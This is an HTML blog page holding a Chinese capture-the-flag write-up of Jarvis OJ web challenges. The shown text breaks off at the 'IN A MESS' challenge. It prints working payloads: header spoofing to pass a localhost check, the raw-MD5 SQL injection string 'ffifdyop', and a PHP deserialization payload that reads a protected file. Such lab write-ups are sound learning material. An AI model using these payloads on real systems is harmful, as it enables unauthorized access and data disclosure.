@@ -1,0 +1,1399 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/02.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/02.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/02.png?v=6.5.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.5.0',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言我还是太懒了，已经半年没更新博客，跟个废人一样。==这个学期要振作起来！== 前天刚打完广东的强网杯，开始打时，醒来已经12多点，队友都差不多AK完了web,本菜鸡就只能玩了下MISC，然后就去摸鱼了，下面附上队友大腿的WP2019广东省强网杯writeup  另外：舍友安利了一个不错的CTF平台，趁这段时间课少，刷些基础题来提升一下，记录这段时间web狗的学习过程  PORT51题目入口：h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="新学期新面貌">
+<meta property="og:url" content="https://cy9nusg4rd3n.github.io/2019/09/11/新学期新面貌/index.html">
+<meta property="og:site_name" content="Cy9nus&#39;s Blog">
+<meta property="og:description" content="前言我还是太懒了，已经半年没更新博客，跟个废人一样。==这个学期要振作起来！== 前天刚打完广东的强网杯，开始打时，醒来已经12多点，队友都差不多AK完了web,本菜鸡就只能玩了下MISC，然后就去摸鱼了，下面附上队友大腿的WP2019广东省强网杯writeup  另外：舍友安利了一个不错的CTF平台，趁这段时间课少，刷些基础题来提升一下，记录这段时间web狗的学习过程  PORT51题目入口：h">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-09-11T15:26:53.771Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="新学期新面貌">
+<meta name="twitter:description" content="前言我还是太懒了，已经半年没更新博客，跟个废人一样。==这个学期要振作起来！== 前天刚打完广东的强网杯，开始打时，醒来已经12多点，队友都差不多AK完了web,本菜鸡就只能玩了下MISC，然后就去摸鱼了，下面附上队友大腿的WP2019广东省强网杯writeup  另外：舍友安利了一个不错的CTF平台，趁这段时间课少，刷些基础题来提升一下，记录这段时间web狗的学习过程  PORT51题目入口：h">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Cy9nus's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://cy9nusg4rd3n.github.io/2019/09/11/新学期新面貌/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>新学期新面貌 | Cy9nus's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+	
+    <a href="https://github.com/Cy9nusG4rd3n/Cy9nusG4rd3n.github.io"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+    
+	<header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cy9nus's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">人如果没有梦想，跟咸鱼有什么区别</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cy9nusg4rd3n.github.io/2019/09/11/新学期新面貌/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cy9nus">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cy9nus's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">新学期新面貌
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-09-11 23:26:17 / 修改时间：23:26:53" itemprop="dateCreated datePublished" datetime="2019-09-11T23:26:17+08:00">2019-09-11</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/09/11/新学期新面貌/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2019/09/11/新学期新面貌/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><del>我还是太懒了，已经半年没更新博客，跟个废人一样。</del>==这个学期要振作起来！== 前天刚打完广东的强网杯，开始打时，醒来已经12多点，队友都差不多AK完了web,本菜鸡就只能玩了下MISC，然后就去摸鱼了，<strong>下面附上队友大腿的WP</strong><br><a href="https://lzy-wi.github.io/2019/09/11/qiangwangbei-GD-writewp/#more" target="_blank" rel="noopener">2019广东省强网杯writeup</a></p>
+<ul>
+<li>另外：舍友安利了一个不错的CTF平台，趁这段时间课少，刷些基础题来提升一下，记录这段时间web狗的学习过程</li>
+</ul>
+<h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>题目入口：<a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p>
+<ol>
+<li>点击页面看到如下<blockquote>
+<p>Please use port 51 to visit this site.</p>
+</blockquote>
+</li>
+<li><p>以为用51端口访问，可是网页已经用了32770，改了之后访问不了的</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">单纯的我以为这样:</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//web.jarvisoj.com:51/</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>后来才知道是本地51端口访问,使用curl命令</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --<span class="keyword">local</span>-port <span class="number">51</span> http:<span class="comment">//web.jarvisoj.com:32770/</span></span><br><span class="line"><span class="meta">#PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>题目入口：<a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a><br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost access only!!</span><br></pre></td></tr></table></figure></p>
+<ol>
+<li>X-Forwarded-For 127.0.0.1<blockquote>
+<p>PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要密码才能获得<span class="built_in">flag</span>哦。</span><br></pre></td></tr></table></figure></p>
+<ol>
+<li>进入看到一个提交密码的输入框</li>
+<li>随便输入字符(包括非法字符)都只返回<strong>Wrong Password.</strong></li>
+<li><p>查看response发现</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:"<span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">`admin`</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="string">'".md5($pass,true)."'</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>关键在于md5($pass,true)</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">md5(string,raw)</span><br><span class="line"></span><br><span class="line">string 必需。规定要计算的字符串。 </span><br><span class="line"></span><br><span class="line">raw 可选。规定十六进制或二进制输出格式： </span><br><span class="line"></span><br><span class="line">•  <span class="literal">TRUE</span> – 原始 16 字符二进制格式</span><br><span class="line"></span><br><span class="line">•  <span class="literal">FALSE</span> – 默认。32 字符十六进制数如果md5计算后的值经过hex转成字符串后为 ”<span class="keyword">or</span>’xxx’这样的字符串,则拼接后构成的语句为：</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span> `admin` where <span class="attribute">password</span>=”or’xxx’</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>所以我们要找一个字符串使得md5()后再decode(‘hex’)得到有’</p>
+</li>
+<li>下面提供两个payload<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">content</span>: 129581926211651571912466741651878684928 </span><br><span class="line"></span><br><span class="line"><span class="attribute">hex</span>: 06da5430449f8f6f23dfc1276f722738 </span><br><span class="line"></span><br><span class="line"><span class="attribute">raw</span>: ?T0D??o#??’or’8.N=?</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span>: ffifdyop </span><br><span class="line"></span><br><span class="line"><span class="attribute">hex</span>: 276f722736c95d99e921722cf9ed621c </span><br><span class="line"></span><br><span class="line"><span class="attribute">raw</span>: ‘or’6蒥欓!r,b</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><a href="https://www.freebuf.com/column/150063.html" target="_blank" rel="noopener">参考资料</a></p>
+<ol start="7">
+<li>最后密码输入ffifdyop<blockquote>
+<p>PCTF{R4w_md5_is_d4ng3rous}</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>题目入口：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</span><br></pre></td></tr></table></figure></p>
+<ol>
+<li><p>刷新页面时F12在Network中看到<strong>showimg.php?img=c2hpZWxkLmpwZw==</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下为后面所用到的信息</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'c2hpZWxkLmpwZw=='</span>.decode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="string">'shield.jpg'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'showimg.php'</span>.encode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="string">'c2hvd2ltZy5waHA=\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'index.php'</span>.encode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="string">'aW5kZXgucGhw\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'shield.php'</span>.encode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="string">'c2hpZWxkLnBocA==\n'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>读取showing.php内容:/showimg.php?img=c2hvd2ltZy5waHA=</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	$f = $_GET[<span class="string">'img'</span>];</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span></span><br><span class="line"><span class="php">		$f = base64_decode($f);</span></span><br><span class="line"><span class="php">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span></span><br><span class="line"><span class="php">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php">			readfile($f);</span></span><br><span class="line"><span class="php">		&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>没发现关于flag内容，读取index.php内容:/showimg.php?img=aW5kZXgucGhw</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $x---&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>index.php也没有出现与Flag相关的信息，但是index.php读取的class参数的值，并且没有对参数进行过滤</p>
+</li>
+<li><p>读取shield.php内容,/showimg.php?img=c2hpZWxkLnBocA==</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="comment">//flag is in pctf.php</span></span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">$this</span> -&gt; file = $filename;</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">		</span></span><br><span class="line"><span class="php">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span></span><br><span class="line"><span class="php">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">			&#125;</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可以看到flag在pctf.php中,但做了过滤无法直接读取,考虑到index.php做了反序列化操作,并且在进行初始化的时候，将$filename赋值为pctf.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">'pctf.php'</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构造序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">'pctf.php'</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">echo</span> serialize($x);</span><br><span class="line"></span><br><span class="line"><span class="comment">#O:6:"Shield":1:&#123;s:4:"file";s:8:"pctf.php";&#125;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最终payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--?php </span></span><br><span class="line"><span class="comment">	//Ture Flag : PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;</span></span><br><span class="line"><span class="comment">	//Fake flag:</span></span><br><span class="line"><span class="comment">	echo "FLAG: PCTF&#123;I_4m_not_fl4g&#125;"</span></span><br><span class="line"><span class="comment">?--&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="IN-A-MESS"><a href="#IN-A-MESS" class="headerlink" title="IN A MESS"></a>IN A MESS</h2><p>题目入口：<a href="http://web.jarvisoj.com:32780/" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/</a></p>
+<blockquote>
+<p>连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。</p>
+</blockquote>
+<ol>
+<li><p>查源码发现index.phps</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">	header(<span class="string">'Location: index.php?id=1'</span>);</span></span><br><span class="line"><span class="php">	<span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$id=$_GET[<span class="string">'id'</span>];</span></span><br><span class="line"><span class="php">$a=$_GET[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="php">$b=$_GET[<span class="string">'b'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span></span><br><span class="line"><span class="php">	<span class="keyword">return</span> ;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$data = @file_get_contents($a,<span class="string">'r'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>下面构造payload</p>
